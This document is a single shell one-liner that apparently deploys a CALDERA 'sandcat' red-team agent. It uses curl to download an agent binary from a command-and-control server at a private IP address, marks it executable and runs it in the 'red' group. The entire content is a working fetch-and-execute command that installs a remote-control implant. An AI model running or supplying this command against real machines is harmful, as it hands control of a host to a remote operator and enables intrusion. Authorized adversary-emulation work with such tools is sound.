server="http://10.99.156.47:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > agentb;chmod +x agentb;./agentb -server $server -group red -v
